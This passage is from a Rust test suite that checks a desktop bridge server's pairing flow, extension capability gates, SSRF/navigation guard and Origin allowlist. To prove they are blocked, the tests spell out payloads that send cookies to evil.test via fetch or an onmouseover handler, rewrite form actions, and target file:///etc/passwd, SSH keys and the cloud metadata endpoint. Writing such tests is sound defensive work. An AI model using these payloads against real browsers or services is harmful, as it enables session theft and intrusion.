            "the request must be burned after {MAX_PAIR_CONFIRM_ATTEMPTS} wrong codes, got: {response}"
        );
        assert!(installs.lock().unwrap().is_empty());
        assert!(
            pair_token.read().await.is_empty(),
            "no token may be minted without the displayed code"
        );
    }

    #[tokio::test]
    async fn pair_confirm_is_single_use() {
        let pending = new_pending_pair_requests();
        let pair_token: Arc<TokioRwLock<String>> = Arc::new(TokioRwLock::new(String::new()));

        let (addr, _) = spawn_handshake_handler(pair_token.clone(), pending.clone()).await;
        let requested = send_http(addr, &pair_request_http(TEST_EXTENSION_ID)).await;
        let request_id = json_body(&String::from_utf8_lossy(&requested))["requestId"]
            .as_str()
            .unwrap()
            .to_string();
        let code = read_displayed_code(&pending, &request_id).await;

        let (addr, _) = spawn_handshake_handler(pair_token.clone(), pending.clone()).await;
        let first = send_http(addr, &pair_confirm_http(&request_id, &code)).await;
        assert!(String::from_utf8_lossy(&first).starts_with("HTTP/1.1 200"));
        let minted = pair_token.read().await.clone();

        let (addr, installs) = spawn_handshake_handler(pair_token.clone(), pending.clone()).await;
        let replay = send_http(addr, &pair_confirm_http(&request_id, &code)).await;
        let replay = String::from_utf8_lossy(&replay);

        assert!(
            replay.starts_with("HTTP/1.1 401"),
            "a confirmed code must not be replayable, got: {replay}"
        );
        assert!(installs.lock().unwrap().is_empty());
        assert_eq!(*pair_token.read().await, minted);
    }

    #[tokio::test]
    async fn pair_confirm_rejects_an_expired_request() {
        let pending = new_pending_pair_requests();
        let pair_token: Arc<TokioRwLock<String>> = Arc::new(TokioRwLock::new(String::new()));
        let expired_at = Instant::now()
            .checked_sub(PAIR_REQUEST_TTL + Duration::from_secs(1))
            .expect("clock must support the TTL window");

        pending.lock().await.insert(
            "expired-request".to_string(),
            PendingPairRequest {
                extension_id: TEST_EXTENSION_ID.to_string(),
                code: "ABCDEFGH".to_string(),
                created_at: expired_at,
                failed_attempts: 0,
            },
        );

        let (addr, installs) = spawn_handshake_handler(pair_token.clone(), pending.clone()).await;
        let response = send_http(addr, &pair_confirm_http("expired-request", "ABCDEFGH")).await;
        let response = String::from_utf8_lossy(&response);

        assert!(
            response.starts_with("HTTP/1.1 401"),
            "expected 401, got: {response}"
        );
        assert!(installs.lock().unwrap().is_empty());
        assert!(pair_token.read().await.is_empty());
        assert!(pending.lock().await.is_empty());
    }

    #[tokio::test]
    async fn pair_confirm_accepts_the_code_as_the_user_would_type_it() {
        let pending = new_pending_pair_requests();
        let pair_token: Arc<TokioRwLock<String>> = Arc::new(TokioRwLock::new(String::new()));

        let (addr, _) = spawn_handshake_handler(pair_token.clone(), pending.clone()).await;
        let requested = send_http(addr, &pair_request_http(TEST_EXTENSION_ID)).await;
        let request_id = json_body(&String::from_utf8_lossy(&requested))["requestId"]
            .as_str()
            .unwrap()
            .to_string();
        let code = read_displayed_code(&pending, &request_id).await;
        let typed = format!("{}-{}", &code[..4], &code[4..]).to_lowercase(); // utf8-safe: 32-symbol ASCII alphabet

        let (addr, installs) = spawn_handshake_handler(pair_token, pending).await;
        let response = send_http(addr, &pair_confirm_http(&request_id, &typed)).await;
        let response = String::from_utf8_lossy(&response);

        assert!(
            response.starts_with("HTTP/1.1 200"),
            "dashes and lower case must normalize, got: {response}"
        );
        assert_eq!(
            *installs.lock().unwrap(),
            vec![TEST_EXTENSION_ID.to_string()]
        );
    }

    #[tokio::test]
    async fn pair_request_requires_a_valid_extension_id() {
        let pending = new_pending_pair_requests();
        let (addr, installs) =
            spawn_handshake_handler(Arc::new(TokioRwLock::new(String::new())), pending.clone())
                .await;

        let response = send_http(
            addr,
            "POST /pair/request HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Length: 0\r\n\r\n",
        )
        .await;
        let response = String::from_utf8_lossy(&response);

        assert!(
            response.starts_with("HTTP/1.1 400"),
            "expected 400, got: {response}"
        );
        assert!(pending.lock().await.is_empty());
        assert!(installs.lock().unwrap().is_empty());
    }

    #[tokio::test]
    async fn pair_confirm_without_a_prior_request_is_rejected() {
        let pair_token: Arc<TokioRwLock<String>> = Arc::new(TokioRwLock::new(String::new()));
        let (addr, installs) =
            spawn_handshake_handler(pair_token.clone(), new_pending_pair_requests()).await;

        let response = send_http(addr, &pair_confirm_http("deadbeef", "ABCDEFGH")).await;
        let response = String::from_utf8_lossy(&response);

        assert!(
            response.starts_with("HTTP/1.1 401"),
            "expected 401, got: {response}"
        );
        assert!(installs.lock().unwrap().is_empty());
        assert!(pair_token.read().await.is_empty());
    }

    #[test]
    fn pair_code_uses_an_unambiguous_alphabet() {
        assert!(
            !PAIR_CODE_ALPHABET.iter().any(|c| b"IO01".contains(c)),
            "the alphabet must not pair I/1 or O/0"
        );
        assert!(
            PAIR_CODE_ALPHABET.len().is_power_of_two(),
            "a non power-of-two alphabet biases the modulo draw"
        );

        for _ in 0..64 {
            let code = generate_pair_code();
            assert_eq!(code.len(), PAIR_CODE_LEN);
            assert!(
                code.chars()
                    .all(|c| PAIR_CODE_ALPHABET.contains(&(c as u8))),
                "code {code} left the alphabet"
            );
        }
    }

    #[test]
    fn pair_code_normalization_strips_formatting_only() {
        assert_eq!(normalize_pair_code(" ab3d-ef4h "), "AB3DEF4H");
        assert_eq!(normalize_pair_code("AB3DEF4H"), "AB3DEF4H");
        assert!(pair_code_matches(
            &normalize_pair_code("ab3d ef4h"),
            "AB3DEF4H"
        ));
        assert!(!pair_code_matches(
            &normalize_pair_code("ab3def4"),
            "AB3DEF4H"
        ));
    }

    #[tokio::test]
    async fn pending_pair_requests_expose_the_code_to_the_desktop_ui() {
        let database = Arc::new(TokioMutex::new(
            rusqlite::Connection::open_in_memory().expect("in-memory presence database"),
        ));
        let server = RealtimeServer::new(
            Arc::new(PresenceManager::new(database)),
            Arc::new(TokioRwLock::new(String::new())),
            None,
        );

        let prompt =
            open_pair_request(&server.pending_pair_requests, TEST_EXTENSION_ID.to_string())
                .await
                .unwrap();

        let prompts = server.pending_pair_requests().await;
        assert_eq!(prompts.len(), 1);
        assert_eq!(prompts[0].request_id, prompt.request_id);
        assert_eq!(prompts[0].extension_id, TEST_EXTENSION_ID);
        assert_eq!(prompts[0].code, prompt.code);
        assert!(prompts[0].expires_in_ms > 0);

        assert!(server.cancel_pair_request(&prompt.request_id).await);
        assert!(server.pending_pair_requests().await.is_empty());
        assert!(!server.cancel_pair_request(&prompt.request_id).await);
    }

    #[tokio::test]
    async fn pending_pair_requests_are_capped() {
        let pending = new_pending_pair_requests();
        for _ in 0..MAX_PENDING_PAIR_REQUESTS {
            open_pair_request(&pending, TEST_EXTENSION_ID.to_string())
                .await
                .unwrap();
        }
        assert!(open_pair_request(&pending, TEST_EXTENSION_ID.to_string())
            .await
            .is_err());
    }

    #[test]
    fn pair_manifest_install_auth_accepts_matching_bridge_token() {
        let request = "POST /pair HTTP/1.1\r\nHost: 127.0.0.1\r\nX-Bridge-Token: secret-token\r\nContent-Length: 0\r\n\r\n";

        assert!(is_pair_manifest_install_authorized(request, "secret-token"));
        assert!(!is_pair_manifest_install_authorized(request, "other-token"));
        assert!(!is_pair_manifest_install_authorized(request, ""));
    }

    #[tokio::test]
    async fn pair_non_loopback_returns_403() {
        use tokio::io::{AsyncReadExt, AsyncWriteExt};
        // We can't bind a non-loopback address in tests, so we invoke
        // handle_http_pair directly with a fake peer address.
        let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
        let addr = listener.local_addr().unwrap();
        let pair_token: Arc<TokioRwLock<String>> = Arc::new(TokioRwLock::new(String::new()));
        let pair_token_clone = pair_token.clone();

        // Spawn the handler but inject a non-loopback peer address.
        tokio::spawn(async move {
            let (stream, _real_peer) = listener.accept().await.unwrap();
            let fake_peer = SocketAddr::new(IpAddr::V4(Ipv4Addr::new(192, 168, 1, 1)), 54321);
            RealtimeServer::handle_http_pair(
                stream,
                fake_peer,
                pair_endpoint_state(
                    pair_token_clone,
                    Arc::new(TokioRwLock::new(String::new())),
                    new_pending_pair_requests(),
                ),
            )
            .await;
        });

        let mut client = tokio::net::TcpStream::connect(addr).await.unwrap();
        client
            .write_all(b"POST /pair HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Length: 0\r\n\r\n")
            .await
            .unwrap();
        client.shutdown().await.ok();
        let mut response = Vec::new();
        client.read_to_end(&mut response).await.unwrap();
        let resp = String::from_utf8_lossy(&response);
        assert!(
            resp.starts_with("HTTP/1.1 403"),
            "expected 403, got: {resp}"
        );
        // pair_token must remain empty — no token issued
        assert!(pair_token.read().await.is_empty());
    }

    #[tokio::test]
    async fn pair_token_all_hex_chars() {
        let (addr, pair_token) = spawn_pair_handler().await;
        send_http(
            addr,
            "POST /pair HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Length: 0\r\n\r\n",
        )
        .await;
        let stored = pair_token.read().await.clone();
        assert!(!stored.is_empty());
        assert!(
            stored.chars().all(|c| c.is_ascii_hexdigit()),
            "token must be all hex"
        );
    }

    #[tokio::test]
    async fn test_execute_native_message_ping() {
        let result = RealtimeServer::execute_native_message(
            json!({ "type": "ping" }),
            None,
            &ExtensionCapabilities::none(),
        )
        .await;

        assert!(result.is_ok());
        assert_eq!(result.unwrap(), json!({ "pong": true }));
    }

    #[tokio::test]
    async fn test_execute_native_message_connect_without_app_handle() {
        // Real Chrome extension ids are exactly 32 chars of a-p; connect now
        // validates via is_valid_chrome_extension_id.
        let ext_id = "abcdefghijklmnopabcdefghijklmnop";
        let result = RealtimeServer::execute_native_message(
            json!({ "type": "connect", "extension_id": ext_id }),
            None,
            &ExtensionCapabilities::none(),
        )
        .await;

        assert!(result.is_ok());
        let payload = result.unwrap_or_default();
        assert_eq!(payload.get("connected"), Some(&json!(true)));
        assert_eq!(payload.get("extension_id"), Some(&json!(ext_id)));
    }

    #[tokio::test]
    async fn test_execute_native_message_connect_rejects_invalid_extension_id() {
        let result = RealtimeServer::execute_native_message(
            json!({ "type": "connect", "extension_id": "ext_123" }),
            None,
            &ExtensionCapabilities::none(),
        )
        .await;

        assert!(result.is_err(), "malformed extension ids must be rejected");
    }

    #[tokio::test]
    async fn test_execute_native_message_disconnect_without_app_handle() {
        let result = RealtimeServer::execute_native_message(
            json!({ "type": "disconnect", "reason": "test_disconnect" }),
            None,
            &ExtensionCapabilities::none(),
        )
        .await;

        assert!(result.is_ok());
        let payload = result.unwrap_or_default();
        assert_eq!(payload.get("disconnected"), Some(&json!(true)));
        assert_eq!(payload.get("reason"), Some(&json!("test_disconnect")));
    }

    #[tokio::test]
    async fn test_execute_native_message_rejects_invalid_payload() {
        let result = RealtimeServer::execute_native_message(
            json!({ "type": "unknown_type" }),
            None,
            &ExtensionCapabilities::none(),
        )
        .await;

        assert!(result.is_err());
        assert!(result
            .err()
            .unwrap_or_default()
            .contains("Invalid native message payload"));
    }

    #[tokio::test]
    async fn test_execute_native_message_page_context_requires_app_handle() {
        let result = RealtimeServer::execute_native_message(
            json!({
                "type": "page_context",
                "url": "https://example.com",
                "title": "Example",
                "html": "<html><body>ok</body></html>",
                "selected_text": "ok",
                "tab_id": 1,
                "timestamp": 1
            }),
            None,
            &ExtensionCapabilities::none(),
        )
        .await;

        assert!(result.is_err());
        assert!(result
            .err()
            .unwrap_or_default()
            .contains("Desktop app handle unavailable"));
    }

    #[tokio::test]
    async fn test_execute_native_message_task_result_requires_app_handle() {
        let result = RealtimeServer::execute_native_message(
            json!({
                "type": "task_result",
                "task_id": "task-1",
                "success": true,
                "screenshot": null,
                "result": { "ok": true },
                "error": null,
                "actions_performed": 1,
                "duration": 12
            }),
            None,
            &ExtensionCapabilities::none(),
        )
        .await;

        assert!(result.is_err());
        assert!(result
            .err()
            .unwrap_or_default()
            .contains("Desktop app handle unavailable"));
    }

    // ── F15: native-message capability authorization ────────────────────────
    //
    // Presenting the bridge token used to grant every native message. These pin
    // the refusal so a token-holding peer cannot run JavaScript in the user's
    // signed-in tabs or read their cookies and local storage.

    fn privileged_native_payloads() -> Vec<(Value, &'static str)> {
        vec![
            (
                json!({ "type": "execute_script", "script": "fetch('https://evil.test')" }),
                "script execution",
            ),
            (
                json!({ "type": "get_cookies", "url": "https://example.com" }),
                "cookie access",
            ),
            (
                json!({
                    "type": "set_cookie",
                    "cookie": {
                        "name": "session",
                        "value": "stolen",
                        "domain": null,
                        "path": null,
                        "secure": null,
                        "http_only": null,
                        "expires": null
                    }
                }),
                "cookie access",
            ),
            (
                json!({ "type": "get_local_storage", "key": null, "tab_id": null }),
                "local storage access",
            ),
            (
                json!({ "type": "set_local_storage", "key": "k", "value": "v", "tab_id": null }),
                "local storage access",
            ),
            (
                json!({
                    "type": "set_attribute",
                    "selector": "body",
                    "attribute": "onmouseover",
                    "value": "fetch('https://evil.test/x?c='+document.cookie)",
                    "tab_id": null
                }),
                "script execution",
            ),
        ]
    }

    #[tokio::test]
    async fn privileged_native_messages_are_refused_without_a_negotiated_capability() {
        for (payload, capability) in privileged_native_payloads() {
            let error = RealtimeServer::execute_native_message(
                payload.clone(),
                None,
                &ExtensionCapabilities::none(),
            )
            .await
            .expect_err(&format!("{payload} ran without a capability check"));

            assert!(
                error.contains(capability),
                "expected a {capability} refusal for {payload}, got: {error}"
            );
            assert!(
                !error.contains("Desktop app handle"),
                "{payload} reached the browser sink before the capability check: {error}"
            );
        }
    }

    #[tokio::test]
    async fn a_privileged_message_runs_once_its_capability_is_granted() {
        let mut granted = ExtensionCapabilities::none();
        granted.supports_cookies = true;

        let error = RealtimeServer::execute_native_message(
            json!({ "type": "get_cookies", "url": "https://example.com" }),
            None,
            &granted,
        )
        .await
        .expect_err("no app handle is available in unit tests");

        assert!(
            error.contains("Desktop app handle"),
            "a granted capability must reach the handler, got: {error}"
        );
    }

    #[test]
    fn a_peer_cannot_negotiate_itself_script_cookie_or_storage_access() {
        let negotiated = RealtimeServer::negotiated_capabilities(&json!({
            "type": "connect",
            "extension_id": "abcdefghijklmnopabcdefghijklmnop",
            "capabilities": {
                "version": "9.9.9",
                "supports_accessibility_tree": true,
                "supports_screenshot": true,
                "supports_cookies": true,
                "supports_local_storage": true,
                "supports_form_fill": true,
                "supports_script_execution": true
            }
        }));

        assert!(!negotiated.grants(NativeCapability::ScriptExecution));
        assert!(!negotiated.grants(NativeCapability::Cookies));
        assert!(!negotiated.grants(NativeCapability::LocalStorage));
        assert!(negotiated.supports_accessibility_tree);
        assert!(negotiated.supports_screenshot);
        assert!(negotiated.supports_form_fill);
    }

    #[test]
    fn a_connect_payload_negotiates_only_the_flags_it_declares() {
        let partial = RealtimeServer::negotiated_capabilities(&json!({
            "type": "connect",
            "capabilities": { "supports_screenshot": true }
        }));
        assert!(partial.supports_screenshot);
        assert!(!partial.supports_accessibility_tree);
        assert!(!partial.supports_form_fill);

        let absent = RealtimeServer::negotiated_capabilities(&json!({ "type": "connect" }));
        assert!(!absent.supports_screenshot);
        assert!(!absent.supports_accessibility_tree);
        assert!(!absent.supports_form_fill);
    }

    #[tokio::test]
    async fn set_attribute_cannot_smuggle_script_execution_past_the_capability_gate() {
        // The gate used to name ExecuteScript alone, so this pair ran arbitrary
        // JavaScript in the signed-in tab with no capability at all: the first
        // message writes an inline handler through el.setAttribute, the second
        // dispatches the mouseover that fires it.
        let injection = json!({
            "type": "set_attribute",
            "selector": "body",
            "attribute": "onmouseover",
            "value": "fetch('https://evil.test/x?c='+encodeURIComponent(document.cookie))",
            "tab_id": null
        });

        let error =
            RealtimeServer::execute_native_message(injection, None, &ExtensionCapabilities::none())
                .await
                .expect_err("set_attribute ran without a capability check");

        assert!(
            error.contains("script execution"),
            "expected a script-execution refusal, got: {error}"
        );
        assert!(
            !error.contains("Desktop app handle"),
            "set_attribute reached the browser sink before the capability check: {error}"
        );
    }

    #[test]
    fn every_sink_that_writes_an_attribute_or_a_script_needs_the_script_grant() {
        for message in [
            NativeMessage::ExecuteScript {
                script: "1".to_string(),
                tab_id: None,
            },
            NativeMessage::SetAttribute {
                selector: "form".to_string(),
                attribute: "action".to_string(),
                value: "https://evil.test/collect".to_string(),
                tab_id: None,
            },
        ] {
            assert_eq!(
                NativeCapability::required_for(&message),
                Some(NativeCapability::ScriptExecution)
            );
        }
    }

    fn script_execution_granted() -> ExtensionCapabilities {
        ExtensionCapabilities {
            supports_script_execution: true,
            ..ExtensionCapabilities::none()
        }
    }

    /// CLAUDE-SECURITY F2: the grant says the peer may run *a* script; it never
    /// said which one. The body reached `client.evaluate` unread, so the
    /// content screen the AGI and IPC paths run was a property of those callers
    /// rather than of the sink. The screen runs before the app handle is
    /// resolved, so "Desktop app handle unavailable" means the body got past it.
    #[tokio::test]
    async fn a_peer_holding_the_script_grant_still_cannot_exfiltrate_the_session() {
        for script in [
            "fetch('https://evil.test/x',{method:'POST',body:document.cookie})",
            "const o={};o.l=location;o.l.host='evil.test'",
        ] {
            let error = RealtimeServer::execute_native_message(
                json!({ "type": "execute_script", "script": script, "tab_id": null }),
                None,
                &script_execution_granted(),
            )
            .await
            .expect_err("an unscreened script body reached the page");
            assert!(
                error.starts_with("Blocked browser script:"),
                "expected the content screen to refuse {script}, got: {error}"
            );
        }

        let allowed = RealtimeServer::execute_native_message(
            json!({ "type": "execute_script", "script": "return document.title", "tab_id": null }),
            None,
            &script_execution_granted(),
        )
        .await
        .expect_err("no app handle is available in tests");
        assert!(
            allowed.contains("Desktop app handle"),
            "a plain DOM read must still reach the browser: {allowed}"
        );
    }

    /// An attribute write is script execution spelled without the word:
    /// `onmouseover` runs on the next hover, and a URL attribute submits or
    /// loads off origin.
    #[tokio::test]
    async fn a_peer_may_not_write_an_event_handler_or_a_url_attribute() {
        for (attribute, value) in [
            (
                "onmouseover",
                "fetch('https://evil.test/x?c='+document.cookie)",
            ),
            ("href", "https://evil.test/collect"),
            ("action", "https://evil.test/collect"),
            ("style", "background:url(https://evil.test/x)"),
            ("data-note", "https://evil.test/collect"),
        ] {
            let error = RealtimeServer::execute_native_message(
                json!({
                    "type": "set_attribute",
                    "selector": "body",
                    "attribute": attribute,
                    "value": value,
                    "tab_id": null
                }),
                None,
                &script_execution_granted(),
            )
            .await
            .expect_err("an unscreened attribute write reached the page");
            assert!(
                error.starts_with("Blocked attribute write:"),
                "expected the attribute screen to refuse {attribute}, got: {error}"
            );
        }

        let allowed = RealtimeServer::execute_native_message(
            json!({
                "type": "set_attribute",
                "selector": "input[name=first]",
                "attribute": "value",
                "value": "Ada",
                "tab_id": null
            }),
            None,
            &script_execution_granted(),
        )
        .await
        .expect_err("no app handle is available in tests");
        assert!(
            allowed.contains("Desktop app handle"),
            "filling a form field must still reach the browser: {allowed}"
        );
    }

    // ── F23: where a bridge peer may drive the browser ──────────────────────
    //
    // Navigate used to hand `url` straight to Page.navigate, so the peer could
    // open a local file or an internal service and read it back. The guard runs
    // before the app handle is resolved, so "Desktop app handle unavailable"
    // means the message got past it.

    async fn native_message_error(payload: Value) -> String {
        RealtimeServer::execute_native_message(
            payload.clone(),
            None,
            &ExtensionCapabilities::none(),
        )
        .await
        .expect_err(&format!("{payload} was not refused"))
    }

    #[tokio::test]
    async fn navigate_refuses_local_files_and_internal_destinations() {
        for url in [
            "file:///etc/passwd",
            "file:///Users/victim/.ssh/id_rsa",
            "data:text/html,<script>fetch('https://evil.test')</script>",
            "javascript:alert(document.cookie)",
            "chrome://settings",
            "http://127.0.0.1:8080/admin",
            "http://localhost:3000/",
            "https://api.localhost/",
            "http://[::1]:9229/json",
            "http://10.1.2.3/",
            "http://192.168.1.1/",
            "http://172.16.0.9/",
            "http://169.254.169.254/latest/meta-data/",
            "http://[::ffff:169.254.169.254]/",
            "http://100.64.0.1/",
            "http://0.0.0.0/",
            "http://2130706433/",
            "http://127.1/",
        ] {
            let error = native_message_error(json!({ "type": "navigate", "url": url })).await;
            assert!(
                !error.contains("Desktop app handle"),
                "{url} reached the browser: {error}"
            );

            let error = native_message_error(json!({ "type": "create_tab", "url": url })).await;
            assert!(
                !error.contains("Desktop app handle"),
                "{url} reached tab creation: {error}"
            );
        }
    }

    #[tokio::test]
    async fn navigate_refuses_a_host_whose_address_cannot_be_checked() {
        let error = native_message_error(
            json!({ "type": "navigate", "url": "https://never-resolves.invalid/" }),
        )
        .await;

        assert!(
            error.contains("did not resolve"),
            "an unresolvable host must fail closed, got: {error}"
        );
    }

    #[tokio::test]
    async fn navigate_still_reaches_the_browser_for_a_public_destination() {
        let error =
            native_message_error(json!({ "type": "navigate", "url": "http://93.184.216.34/" }))
                .await;

        assert!(
            error.contains("Desktop app handle"),
            "a public destination must pass the guard, got: {error}"
        );
    }

    #[test]
    fn page_reads_are_refused_when_the_tab_landed_on_an_internal_document() {
        // A redirect the guard never saw is the way an internal service still
        // ends up in the tab, so the live document is what decides the read.
        for url in [
            "http://169.254.169.254/latest/meta-data/",
            "http://127.0.0.1:3000/admin",
            "http://localhost:8080/",
            "http://192.168.0.1/",
            "http://[::1]/",
            "file:///etc/passwd",
        ] {
            assert!(
                RealtimeServer::ensure_document_readable(url).is_err(),
                "expected a read of {url} to be refused"
            );
        }
    }

    #[test]
    fn page_reads_still_work_on_an_ordinary_document() {
        for url in [
            "https://example.com/docs",
            "http://93.184.216.34/",
            "about:blank",
            "",
        ] {
            assert!(
                RealtimeServer::ensure_document_readable(url).is_ok(),
                "expected a read of {url} to be allowed"
            );
        }
    }

    #[test]
    fn an_authenticated_connection_starts_with_no_capabilities() {
        let client = WebSocketClient {
            id: "client-1".to_string(),
            user_id: Some("vscode-extension".to_string()),
            team_id: None,
            current_resource: None,
            capabilities: ExtensionCapabilities::none(),
        };

        for capability in [
            NativeCapability::ScriptExecution,
            NativeCapability::Cookies,
            NativeCapability::LocalStorage,
        ] {
            assert!(!client.capabilities.grants(capability));
        }
    }

    // ── B3 fix: Origin allowlist tests ──────────────────────────────────────
    //
    // The previous implementation used `origin.starts_with("http://localhost")`
    // which silently allowed `http://localhost.attacker.com`. These tests
    // pin the new exact-host behaviour so a future refactor cannot regress.

    #[test]
    fn origin_none_allowed_for_tauri_native() {
        assert!(is_origin_allowed(None));
    }

    #[test]
    fn origin_null_allowed_for_tauri_string() {
        assert!(is_origin_allowed(Some("null")));
    }

    #[test]
    fn origin_chrome_extension_allowed() {
        assert!(is_origin_allowed(Some(
            "chrome-extension://abcdefghijklmnopabcdefghijklmnop"
        )));
    }

    #[test]
    fn origin_vscode_webview_allowed() {
        assert!(is_origin_allowed(Some(
            "vscode-webview://12345678-1234-1234-1234-1234567890ab"
        )));
    }

    #[test]
    fn origin_vscode_file_allowed() {
        assert!(is_origin_allowed(Some("vscode-file://./foo")));
    }

    #[test]
    fn origin_localhost_with_port_allowed() {
        assert!(is_origin_allowed(Some("http://localhost:3000")));
    }

    #[test]
    fn origin_localhost_https_allowed() {
        assert!(is_origin_allowed(Some("https://localhost")));
    }

    #[test]
    fn origin_127_0_0_1_with_port_allowed() {
        assert!(is_origin_allowed(Some("http://127.0.0.1:8787")));
    }

    #[test]
    fn origin_ipv6_loopback_allowed() {
        assert!(is_origin_allowed(Some("http://[::1]:8080")));
    }

    #[test]
    fn origin_localhost_subdomain_attack_rejected() {
        // B3 regression test: prefix-match would have accepted this.
        assert!(!is_origin_allowed(Some("http://localhost.attacker.com")));
    }

    #[test]
    fn origin_127_0_0_1_subdomain_attack_rejected() {
        assert!(!is_origin_allowed(Some("http://127.0.0.1.attacker.com")));
    }

    #[test]
    fn origin_arbitrary_https_rejected() {
        assert!(!is_origin_allowed(Some("https://attacker.com")));
    }

    #[test]
    fn origin_arbitrary_http_rejected() {
        assert!(!is_origin_allowed(Some("http://evil.example.com")));
    }

    #[test]
    fn origin_unsupported_scheme_rejected() {
        assert!(!is_origin_allowed(Some("file:///etc/passwd")));
        assert!(!is_origin_allowed(Some("ftp://localhost")));
        assert!(!is_origin_allowed(Some("javascript:void(0)")));
    }

    #[test]
    fn origin_malformed_rejected() {
        assert!(!is_origin_allowed(Some("not-a-url")));
        assert!(!is_origin_allowed(Some("http://")));
        // Unclosed IPv6 bracket.
        assert!(!is_origin_allowed(Some("http://[::1")));
    }

    #[test]
    fn origin_localhost_no_port_allowed() {
        assert!(is_origin_allowed(Some("http://localhost")));
        assert!(is_origin_allowed(Some("http://127.0.0.1")));
        assert!(is_origin_allowed(Some("http://[::1]")));
    }
}
